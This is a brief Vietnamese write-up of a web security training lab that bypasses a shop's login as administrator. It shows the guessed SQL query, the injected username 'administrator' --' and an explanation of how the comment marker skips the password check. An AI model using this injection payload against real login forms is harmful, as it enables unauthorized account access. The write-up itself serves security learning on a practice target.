![image](https://user-images.githubusercontent.com/125866921/231201527-23dc2123-be86-4120-9484-9f6d5f5ab95e.png)

  - Ở phần lab này nhiệm vụ của chúng ta là phải đăng nhập cửa hàng với quyền admin.  
  - Phần truy vấn ở lab này có vẻ tương tự như sau:  

        SELECT * FROM users WHERE username = '<USERNAME>' AND password = '<PASSWORD>'  
        
  - Do đó ta sẽ sử dụng với tài khoản và mật khẩu như sau:  

        administrator' --  
        Trongdeptrai  
        
  - Khi đó kết quả của việc truy vấn sẽ như thế này:  

        SELECT * FROM users WHERE username = 'administrator' -- ' AND password = '<PASSWORD>'  
        
  - Kí tự ``--`` sẽ bỏ qua tất cả những gì sau nó do đó ta có thể nhập mật khẩu theo bất cứ gì mình thích.  
        
![image](https://user-images.githubusercontent.com/125866921/231203907-9e258734-c03d-4392-9ce0-8ce58070d2e0.png)
